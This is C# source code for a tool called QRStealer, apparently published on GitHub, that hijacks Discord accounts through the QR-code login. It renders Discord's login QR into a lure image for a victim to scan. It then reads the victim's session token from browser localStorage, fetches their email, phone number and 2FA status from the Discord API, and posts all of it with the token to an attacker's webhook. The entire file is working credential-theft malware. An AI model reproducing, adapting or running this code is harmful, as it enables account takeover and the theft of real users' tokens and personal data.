using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using SeleniumExtras.WaitHelpers;
using System;
using System.Drawing;
using System.IO;
using Leaf.xNet;
using System.Net;
using Newtonsoft.Json.Linq;

/* 
       │ Author       : extatent
       │ Name         : QRStealer
       │ GitHub       : https://github.com/extatent
*/

namespace QRStealer
{
    class Program
    {
        #region Configs
        static string webhook;
        static string token;
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Console.Title = "QRStealer | extatent";
            Console.WriteLine("GitHub: https://github.com/extatent");
            try
            {
                Console.Write("Enter your Discord webhook: ");
                webhook = Console.ReadLine();
            }
            catch
            {
                Console.WriteLine("Invalid webhook. Press any key to exit.");
                Console.ReadKey();
                Environment.Exit(0);
            }
            Start();
            Console.ReadKey();
        }
        #endregion

        #region Start
        static void Start()
        {
            try
            {
                Console.Clear();
                Console.WriteLine("Wait");
                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.EnableVerboseLogging = false;
                service.SuppressInitialDiagnosticInformation = true;
                service.HideCommandPromptWindow = true;

                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--disable-logging");
                options.AddArguments("--mute-audio");
                options.AddArguments("--disable-extensions");
                options.AddArguments("--disable-notifications");
                options.AddArguments("--disable-application-cache");
                options.AddArguments("--no-sandbox");
                options.AddArgument("--disable-crash-reporter");
                options.AddArguments("--disable-dev-shm-usage");
                options.AddArguments("--disable-gpu");
                options.AddArgument("--ignore-certificate-errors");
                options.AddArguments("--disable-infobars");
                options.AddArgument("--window-size=1920,1080");
                options.AddArgument("--start-maximized");
                options.AddArgument("--headless");
                options.AddArgument("--silent");

                IWebDriver driver = new ChromeDriver(service, options);
                driver.Url = "https://discord.com/login";

                Console.Clear();

                try
                {
                    Console.WriteLine("Converting a QR code to an image");
                    var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(20));
                    wait.Until(ExpectedConditions.ElementIsVisible(By.XPath("/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img")));
                    var cls = driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img"));
                    string src = cls.GetAttribute("src");
                    var bytes = Convert.FromBase64String(src.Substring(22));
                    var img = new FileStream("qr.png", FileMode.Create);
                    img.Write(bytes, 0, bytes.Length);
                    img.Close();
                    Console.WriteLine("The QR code was converted");
                }
                catch
                {
                    Console.WriteLine("QR Code wasn't found or failed to create an image.");
                    driver.Close();
                    Console.ReadKey();
                    Environment.Exit(0);
                }

                try
                {
                    // Creating a final image
                    Console.WriteLine("Creating a final image");
                    var overlay = Image.FromFile("overlay.png");
                    var qr = Image.FromFile("qr.png");
                    var draw = Graphics.FromImage(qr);
                    draw.DrawImage(overlay, (qr.Width / 2) - (overlay.Width / 2), (qr.Height / 2) - (overlay.Height / 2));
                    var template = Image.FromFile("template.png");
                    var draw2 = Graphics.FromImage(template);
                    draw2.DrawImage(qr, 120, 409);
                    template.Save("final.png");
                    template.Dispose();
                    overlay.Dispose();
                    qr.Dispose();
                    draw.Dispose();
                    draw2.Dispose();
                    Console.WriteLine("The final image was created\nWaiting for the code to be scanned");
                }
                catch
                {
                    Console.WriteLine("Some of the files wasn't found or failed to create an image.");
                    driver.Close();
                    Console.ReadKey();
                    Environment.Exit(0);
                }

                var current = driver.Url;

                while (true)
                {
                    if (driver.Url != current)
                    {
                        IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                        token = (string)execute.ExecuteScript(@"
window.dispatchEvent(new Event('beforeunload'));
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
let localStorage = iframe.contentWindow.localStorage;
var token = JSON.parse(localStorage.token);
return token;
");
                        driver.Close();
                        Console.WriteLine("Scanned, sending to your webhook");
                        Send();
                        Console.WriteLine("\nPress any key to exit.");
                        Console.ReadKey();
                        Environment.Exit(0);
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        #endregion

        #region Send
        static void Send()
        {
            string id = UserInformation("1");
            if (string.IsNullOrEmpty(id))
            {
                id = "N/A";
            }
            string email = UserInformation("3");
            if (string.IsNullOrEmpty(email))
            {
                email = "N/A";
            }
            string phonenumber = UserInformation("4");
            if (string.IsNullOrEmpty(phonenumber))
            {
                phonenumber = "N/A";
            }
            string bio = UserInformation("5");
            if (string.IsNullOrEmpty(bio))
            {
                bio = "N/A";
            }
            string locale = UserInformation("6");
            if (string.IsNullOrEmpty(locale))
            {
                locale = "N/A";
            }
            string badges = UserInformation("2");
            if (string.IsNullOrEmpty(badges))
            {
                badges = "N/A";
            }
            string nsfwallowed = UserInformation("7");
            if (string.IsNullOrEmpty(nsfwallowed))
            {
                nsfwallowed = "N/A";
            }
            string mfaenabled = UserInformation("8");
            if (string.IsNullOrEmpty(mfaenabled))
            {
                mfaenabled = "N/A";
            }
            string avatar = UserInformation("9");
            if (string.IsNullOrEmpty(avatar))
            {
                avatar = "N/A";
            }
            string theme = UserInformation("10");
            if (string.IsNullOrEmpty(theme))
            {
                theme = "N/A";
            }
            string developermode = UserInformation("11");
            if (string.IsNullOrEmpty(developermode))
            {
                developermode = "N/A";
            }
            string status = UserInformation("12");
            if (string.IsNullOrEmpty(status))
            {
                status = "N/A";
            }
            string nickname = UserInformation("13");
            if (string.IsNullOrEmpty(nickname))
            {
                nickname = "N/A";
            }

            DiscordEmbed("New account from " + nickname, "1018364", id, email, phonenumber, bio, locale, badges, nsfwallowed, mfaenabled, theme, developermode, status, avatar, token);
        }
        #endregion

        #region User Information
        public static string UserInformation(string number)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse userinfo = req.Get($"https://discord.com/api/v10/users/@me");
                    if (number == "1")
                    {
                        var id = JObject.Parse(userinfo.ToString())["id"];
                        return id.ToString();
                    }
                    if (number == "2")
                    {
                        var getbadges = JObject.Parse(userinfo.ToString())["flags"].ToString();
                        string badges = "";
                        if (getbadges == "1")
                        {
                            badges += "Staff, ";
                        }
                        if (getbadges == "2")
                        {
                            badges += "Partner, ";
                        }
                        if (getbadges == "4")
                        {
                            badges += "HypeSquad Events, ";
                        }
                        if (getbadges == "8")
                        {
                            badges += "Bug Hunter Level 1, ";
                        }
                        if (getbadges == "64")
                        {
                            badges += "HypeSquad Bravery, ";
                        }
                        if (getbadges == "128")
                        {
                            badges += "HypeSquad Brilliance, ";
                        }
                        if (getbadges == "256")
                        {
                            badges += "HypeSquad Balance, ";
                        }
                        if (getbadges == "512")
                        {
                            badges += "Early Supporter, ";
                        }
                        if (getbadges == "16384")
                        {
                            badges += "Bug Hunter Level 2, ";
                        }
                        if (getbadges == "131072")
                        {
                            badges += "Verified Bot Developer, ";
                        }
                        return badges;
                    }
                    if (number == "3")
                    {
                        var email = JObject.Parse(userinfo.ToString())["email"];
                        return email.ToString();
                    }

                    if (number == "4")
                    {
                        var phone = JObject.Parse(userinfo.ToString())["phone"];
                        return phone.ToString();
                    }
                    if (number == "5")
                    {
                        var bio = JObject.Parse(userinfo.ToString())["bio"];
                        return bio.ToString();
                    }
                    if (number == "6")
                    {
                        var locale = JObject.Parse(userinfo.ToString())["locale"];
                        return locale.ToString();
                    }
                    if (number == "7")
                    {
                        var nsfw = JObject.Parse(userinfo.ToString())["nsfw_allowed"];
                        return nsfw.ToString();
                    }
                    if (number == "8")
                    {
                        var mfa = JObject.Parse(userinfo.ToString())["mfa_enabled"];
                        return mfa.ToString();
                    }
                    if (number == "9")
                    {
                        var id = JObject.Parse(userinfo.ToString())["id"];
                        var avatarid = JObject.Parse(userinfo.ToString())["avatar"];
                        if (string.IsNullOrEmpty(avatarid.ToString()))
                        {
                            return "N/A";
                        }
                        string avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                        return avatar;
                    }
                    if (number == "13")
                    {
                        var nickname = JObject.Parse(userinfo.ToString())["username"];
                        return nickname.ToString();
                    }
                    req.Close();
                    req.AddHeader("Authorization", token);
                    HttpResponse userinfo2 = req.Get($"https://discord.com/api/v10/users/@me/settings");
                    if (number == "10")
                    {
                        var theme = JObject.Parse(userinfo2.ToString())["theme"];
                        return theme.ToString();
                    }
                    if (number == "11")
                    {
                        var devmode = JObject.Parse(userinfo2.ToString())["developer_mode"];
                        return devmode.ToString();
                    }
                    if (number == "12")
                    {
                        var status = JObject.Parse(userinfo2.ToString())["status"];
                        return status.ToString();
                    }
                    req.Close();
                }
                return "";
            }
            catch { return ""; }
        }
        #endregion

        #region Discord Embed
        static void DiscordEmbed(string title, string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8, string field9, string field10, string field11, string field12, string field13)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent | QRStealer\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"NSFW Allowed\",\"value\":\"" + field7 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field8 + "\"},{\"name\":\"Theme\",\"value\":\"" + field9 + "\"},{\"name\":\"Developer Mode\",\"value\":\"" + field10 + "\"},{\"name\":\"Status\",\"value\":\"" + field11 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field12 + "\"},{\"name\":\"DT\",\"value\":\"" + field13 + "\"}]}]}");
                wr.GetResponse();
            }
            catch { }
        }
        #endregion
    }
}